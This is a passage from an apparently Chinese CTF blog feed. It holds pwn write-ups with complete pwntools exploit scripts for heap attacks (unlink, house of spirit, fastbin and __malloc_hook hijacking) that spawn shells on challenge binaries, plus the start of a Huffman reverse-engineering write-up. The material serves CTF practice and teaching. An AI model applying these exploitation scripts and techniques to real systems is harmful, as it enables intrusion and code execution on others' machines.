puts，泄漏 libc 地址</p><p>再次修改 strlen 为 system ，getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> elftools.construct <span class="hljs-keyword">import</span> lib<br><span class="hljs-keyword">from</span> elftools.elf.sections <span class="hljs-keyword">import</span> Symbol<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><br><span class="hljs-comment"># p = process([ld_file_name, &#x27;./stkof&#x27;],</span><br><span class="hljs-comment">#            env = &#123;&quot;LD_PRELOAD&quot;: libc_file_name&#125;)</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">29213</span>)<br><br>libc = ELF(libc_file_name)<br>elf = ELF(<span class="hljs-string">&#x27;stkof&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new_note</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>  <br>    p.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>   <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_note</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free_note</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>new_note(<span class="hljs-number">0x50</span>)<br>edit_note(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x50</span>)<br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x100</span>)<br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x100</span>)<br><br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;E&#x27;</span> * <span class="hljs-number">0x100</span>)<br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;F&#x27;</span> * <span class="hljs-number">0x100</span>)<br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br><br>target = <span class="hljs-number">0x602160</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(target - <span class="hljs-number">0x18</span>) + p64(target - <span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;D&#x27;</span> * <span class="hljs-number">0xE0</span> + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x110</span>)<br>edit_note(<span class="hljs-number">4</span>, fake_chunk)<br>free_note(<span class="hljs-number">5</span>)<br>edit_note(<span class="hljs-number">4</span>, p64(<span class="hljs-number">0x602030</span>))<br>edit_note(<span class="hljs-number">1</span>, p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])) <span class="hljs-comment"># 修改 strlen.got =&gt; puts</span><br>edit_note(<span class="hljs-number">4</span>, p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>call(<span class="hljs-number">1</span>)<br>p.recvn(<span class="hljs-number">1</span>)<br>leak_puts = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>print(<span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>edit_note(<span class="hljs-number">4</span>, p64(<span class="hljs-number">0x602030</span>))<br>edit_note(<span class="hljs-number">1</span>, p64(libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>call(<span class="hljs-number">6</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># input(&#x27;&gt;&gt;&#x27;)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Unlink-攻击&quot;&gt;&lt;a href=&quot;#Unlink-攻击&quot; class=&quot;headerlink&quot; title=&quot;Unlink 攻击&quot;&gt;&lt;/a&gt;Unlink 攻击&lt;/h1&gt;&lt;p&gt;Unlink 也是一种很常见的堆溢出利用手段&lt;/p&gt;
&lt;p&gt;我认为 unlink 攻</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://panda0s.top/tags/PWN/"/>
    
    <category term="heap" scheme="https://panda0s.top/tags/heap/"/>
    
    <category term="unlink" scheme="https://panda0s.top/tags/unlink/"/>
    
  </entry>
  
  <entry>
    <title>house of spirit</title>
    <link href="https://panda0s.top/2021/06/10/house-of-spirit/"/>
    <id>https://panda0s.top/2021/06/10/house-of-spirit/</id>
    <published>2021-06-10T14:04:01.000Z</published>
    <updated>2021-06-22T18:28:15.109Z</updated>
    
    <content type="html"><![CDATA[<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>这种利用方式主要是在栈上构造 fake chunk，从而更好的控制栈，修改返回地址。</p><p>利用条件： </p><ol><li>free(p) 中的 p 可控</li><li>可以泄漏栈地址</li><li>不可控区域前后都有区域可控（如图）</li></ol><img src="/2021/06/10/house-of-spirit/image-20210610233920442.png" class="" title="image-20210610233920442"><p>利用思路：</p><p>在栈中构造 fake chunk，大小覆盖掉函数的返回地址，再次分配得到返回地址控制，写入 one_gadget 或者 shellcode 地址。</p><p>注意如果构造 fastbin，free 函数会检测 next chunk 的大小与当前的 fake chunk 大小是否一致，需要绕过!</p><p>另外 fake fastbin chunk 的条件</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于 av-&gt;system_mem 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h2 id="LCTF2016-pwn200"><a href="#LCTF2016-pwn200" class="headerlink" title="LCTF2016  pwn200"></a>LCTF2016  pwn200</h2><p>这个也是 BUU 上的一道经典例题</p><ol><li><p>该题的栈有 RWX 权限，可以放 shellcode</p></li><li><p>存在 rbp 地址泄漏</p> <img src="/2021/06/10/house-of-spirit/image-20210610235253636.png" class="" title="image-20210610235253636"><p> v2 填满 shellcode 后地址</p></li></ol><ol start="3"><li><p>sub_400A29 存在栈溢出，只能溢出掉 free(p) 中的 p 参数</p> <img src="/2021/06/10/house-of-spirit/image-20210610234812266.png" class="" title="image-20210610234812266"><p> 如图， buf 只有 58 字节，read 可以读入 64 字节，溢出 dest 变量。ptr 指针在后面的操作中会被当作 free 的参数</p></li><li><p>sub_400A29 调用之前的栈可控，构造 next chunk 的 size 域</p> <img src="/2021/06/10/house-of-spirit/image-20210610235059243.png" class="" title="image-20210610235059243"></li></ol><p>解题思路</p><p>who are u? 传 shellcode 并填充满 42 字节泄漏 rbp</p><p>give me your id ~~? 传入 fake chunk 的大小，这里可以控制 fake chunk 的 next chunk 的 size 域。</p><p>give me money~ 传入 fake chunk，并修改 ptr 变量为 fake chunk 地址</p><p>先选 choice 1，free(ptr)，将 fake chunk 插入到 fastbin</p><p>再选 choice 2，从 fastbin 从分配出栈内存，并修改地址为 shellcode 的地址</p><p>完整 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><br>p = process([ld_file_name, <span class="hljs-string">&#x27;./pwn200&#x27;</span>],<br>           env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: libc_file_name&#125;)<br><br><span class="hljs-comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 25523)</span><br><br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>print(<span class="hljs-string">&quot;shellcode len:&quot;</span> , <span class="hljs-built_in">len</span>(shellcode))<br>p.send(shellcode)<br>p.recvn(<span class="hljs-number">48</span>)<br>leak_rbp = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak rbp: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_rbp))<br><br>p.recvuntil(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x61</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><span class="hljs-comment"># 64</span><br>fake_chunk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">40</span> + p64(leak_rbp - <span class="hljs-number">0xc0</span> + <span class="hljs-number">0x10</span>)<br>p.send(fake_chunk)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choice</span>(<span class="hljs-params">s</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;your choice : &#x27;</span>)<br>    p.sendline(s)<br><br>choice(<span class="hljs-string">&#x27;2&#x27;</span>)<br>choice(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;how long?\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x50</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;\n%d\n&#x27;</span> % <span class="hljs-number">0x50</span>)<br>p.sendline(<span class="hljs-string">b&#x27;D&#x27;</span> * <span class="hljs-number">56</span> + p64(leak_rbp - <span class="hljs-number">0x50</span>))<br><span class="hljs-comment">#choice(&#x27;3&#x27;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;house-of-spirit&quot;&gt;&lt;a href=&quot;#house-of-spirit&quot; class=&quot;headerlink&quot; title=&quot;house of spirit&quot;&gt;&lt;/a&gt;house of spirit&lt;/h1&gt;&lt;p&gt;这种利用方式主要是在栈上构造 fak</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://panda0s.top/tags/PWN/"/>
    
    <category term="heap" scheme="https://panda0s.top/tags/heap/"/>
    
    <category term="fastbin" scheme="https://panda0s.top/tags/fastbin/"/>
    
    <category term="house_of_spirit" scheme="https://panda0s.top/tags/house-of-spirit/"/>
    
    <category term="shellcode" scheme="https://panda0s.top/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>0cft2017 babyheap</title>
    <link href="https://panda0s.top/2021/06/10/0cft2017-babyheap/"/>
    <id>https://panda0s.top/2021/06/10/0cft2017-babyheap/</id>
    <published>2021-06-10T11:19:49.000Z</published>
    <updated>2021-06-10T12:28:27.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0ctf2017-babyheap"><a href="#0ctf2017-babyheap" class="headerlink" title="0ctf2017 babyheap"></a>0ctf2017 babyheap</h1><p>复现了一道非常经典简单的堆题</p><p>分两步: </p><ol><li>泄漏 libc 地址</li><li>fastbin attack 修改 _malloc_hook</li></ol><p>有一个堆溢出洞，写内存时没有做长度限制。<br>观察一下，虽然开启了地址随机化，但是 Chunk 地址的最后一字节总是固定的，这意味着修改低位字节能在不泄漏地址的情况下指向其它 chunk。</p><p>可以构造两个 fastbin 中的 chunk1 和 chunk2 ，其中一个 chunk1-&gt;fd 指向  chunk2，利用 chunk1 的物理前一个 chunk 修改 chunk1-&gt;fd 的最高字节，使其指向<em>将来</em>要放到 unsorted bin 中的 chunk3 (提前分配大于0x80)。</p><p>此时: chunk1-&gt;fd = chunk3 (将来会放入unsorted bin)</p><p>通过 chunk3 物理前一个 chunk 修改chunk3-&gt;size 字段, 使其与 chunk1-&gt; size 相等，然后再申请两次 fastbin 得到 chunk3 的内存B。</p><p>得到 chunk3 的地址后，将 chunk3-&gt;size 还原，再释放 chunk3 ，使其进入 unsorted bin，由于此时 unsorted bin 中只有一个chunk，故 fd 指向 main_arena 中的地址，利用第二次申请 chunk3 内存读取 fd 即可。</p><ol start="2"><li>劫持 _malloc_hook 执行 one_gadget</li></ol><p>fastbin 伪造，只要把 size 搞好就行，_malloc_hook 附近有很多 0x7f，malloc 只会检测对齐后的长度，所以 0x7f 是可以用的，用 0x71 伪造 fastbin， 并使其 fd 字段指向 _malloc_hook 附近的 7f 00 00 00 00 前 8 字节地址。</p><p>one_gadget 条件不太好满足，大多数对栈有要求</p><img src="/2021/06/10/0cft2017-babyheap/image-20210610201008781.png" class="" title="image-20210610201008781"><p>可以进一步利用 realloc_hook 调整栈</p><p>即 malloc_hook 设置为 realloc，再由 realloc_hook 跳转到 one_gadget, 这是因为 realloc 头部有很多 push 指令可以调整栈</p><p>realloc_hook 与 malloc_hook 相邻，可以一起改写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">realloc = libc_base + libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>realloc_off = <span class="hljs-number">0x2</span> * <span class="hljs-number">2</span><br>fill(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xb</span> + p64(one_gadget) + p64(realloc + realloc_off))<br><span class="hljs-comment"># 可以记一下固定偏移 _malloc_hook - 0x23 可以用来构造 fastbin chunk，大小0x7f</span><br></code></pre></td></tr></table></figure><p>realloc 头部有很多 push 指令可以用于调整栈，加上适当的偏移 <code>realloc_off</code> 就可以控制压栈数量，从而使 one_gadget 条件满足。</p><p>另外记录一下 main_arena 偏移获取，题目给的 libc 没有调试符号，symbols 里面没有 main_arena，这种情况就只能自己手动找偏移</p><p>用 IDA 打开 libc，定位到 <code>malloc_trim</code> 函数</p><img src="/2021/06/10/0cft2017-babyheap/image-20210610202152312.png" class="" title="image-20210610202152312"><p>此处的 3C4B20 即为 <code>main_arena </code> 偏移</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><br><span class="hljs-comment"># p = process([ld_file_name, &#x27;./0ctf_2017_babyheap&#x27;],</span><br><span class="hljs-comment">#            env = &#123;&quot;LD_PRELOAD&quot;: libc_file_name&#125;)</span><br><br>libc = ELF(libc_file_name)<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">29896</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span>(<span class="hljs-params">size</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">idx,payload</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>) <br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    p.send(payload) <br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))   <br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>) <br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))    <br>    p.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br><br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x80</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>))<br>fill(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;\x80&#x27;</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">4</span>)<br>dump(<span class="hljs-number">2</span>)<br>leak_main_arena_off = u64(p.recvn(<span class="hljs-number">8</span>))<br>leak_main_arena = leak_main_arena_off - <span class="hljs-number">0x58</span><br>libc_base = leak_main_arena - <span class="hljs-number">0x3C4B20</span><br><br>print(<span class="hljs-string">&quot;leak main arena: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_main_arena_off))<br>print(<span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br><br><span class="hljs-comment">#free(4)</span><br>free(<span class="hljs-number">6</span>)<br>fill(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;C&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + p64(leak_main_arena_off - <span class="hljs-number">0x83</span> - <span class="hljs-number">8</span>))<br>alloc(<span class="hljs-number">0x60</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br><br>one_gadget = libc_base + <span class="hljs-number">0xf1147</span><br>realloc = libc_base + libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>realloc_off = <span class="hljs-number">0x2</span> * <span class="hljs-number">2</span><br>print(<span class="hljs-string">&quot;realloc: &quot;</span>, <span class="hljs-built_in">hex</span>(realloc))<br>print(<span class="hljs-string">&quot;one gadget: &quot;</span>, <span class="hljs-built_in">hex</span>(one_gadget))<br>fill(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xb</span> + p64(one_gadget) + p64(realloc + realloc_off))<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b *&#x27; + hex(one_gadget))</span><br><span class="hljs-comment"># input(&quot;&gt;&gt;&quot;)</span><br>alloc(<span class="hljs-number">0x8</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0ctf2017-babyheap&quot;&gt;&lt;a href=&quot;#0ctf2017-babyheap&quot; class=&quot;headerlink&quot; title=&quot;0ctf2017 babyheap&quot;&gt;&lt;/a&gt;0ctf2017 babyheap&lt;/h1&gt;&lt;p&gt;复现了一道非常经典简</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://panda0s.top/tags/PWN/"/>
    
    <category term="heap" scheme="https://panda0s.top/tags/heap/"/>
    
    <category term="fastbin" scheme="https://panda0s.top/tags/fastbin/"/>
    
    <category term="one_gadget" scheme="https://panda0s.top/tags/one-gadget/"/>
    
    <category term="overlap" scheme="https://panda0s.top/tags/overlap/"/>
    
  </entry>
  
  <entry>
    <title>Redhat-filestore</title>
    <link href="https://panda0s.top/2021/05/28/Redhat-filestore/"/>
    <id>https://panda0s.top/2021/05/28/Redhat-filestore/</id>
    <published>2021-05-27T18:08:49.000Z</published>
    <updated>2021-05-27T19:26:47.120Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红帽杯2021-file-store"><a href="#红帽杯2021-file-store" class="headerlink" title="红帽杯2021 file_store"></a>红帽杯2021 file_store</h1><p>题目下载: <a href="/2021/05/28/Redhat-filestore/file_store.zip" title="file_store.zip">file_store.zip</a></p><p>做这道题之前可以先学习一下 Huffman 编码，同时这道题还涉及到大量的 stl 使用，可以锻炼 stl 逆向分析能力。Huffman 一般用于数据压缩，与题目名比较吻合。这道题其实是利用 Huffman 编码对 flag 文件进行编码，解题方法是解压 Huffman 编码过的文件即可。</p><p>这道题压缩方案是利用传统 Huffman 树构造方法，统计词频并根据词频高低构造 Huffman 树，用 01 串表示词在 Huffman 树中的位置，最后将 01 串转换成字节流。</p><p>要解压缩某个数据，必须要有该数据文件对应的 Huffman 树的结构，因此题目提供了 flag.txt.shuffled 文件，该文件打乱了 flag.txt 的顺序，但是词频没有变，使用该文件构造 Huffman 树，即可对 flag.bin 解压。</p><p>⚠️这道题中，词 = 字符，词频就是字符出现的次数</p><h2 id="Huffman-树的构造"><a href="#Huffman-树的构造" class="headerlink" title="Huffman 树的构造"></a>Huffman 树的构造</h2><p>函数地址: 40184A</p><ol><li>词频统计 </li></ol><p>Huffman 树中节点的构造依赖于词频分析，“词”的含义不是一个单词，而是一个字节。词频越高意味使用次数越多，就越靠近跟节点，01 串表示的路径就跟短，有利于压缩。</p><img src="/2021/05/28/Redhat-filestore/image-20210528022418649.png" class="" title="image-20210528022418649"><p>逆向 stl 的时候经常遇到 “迭代器” </p><ol start="2"><li>为每一个不重复的字符创建 Huffman 节点，高度为1，并将新创建的节点加入到 Huffman 森林（arrayResult 数组）</li></ol><img src="/2021/05/28/Redhat-filestore/image-20210528022544914.png" class="" title="image-20210528022544914"><ol start="3"><li>从 Huffman 森林中选出某些树合并</li></ol><p>标准 Huffman 树是选出权制最小的两棵子树合并，但是这道题似乎并不是这样</p><img src="/2021/05/28/Redhat-filestore/image-20210528022925031.png" class="" title="image-20210528022925031"><p>循环退出的条件是 Huffman 森林中只有一颗🌲</p><ol start="4"><li>遍历计算路径 函数地址: 4016D6</li></ol><p>0 代表走左，1代表走右</p><img 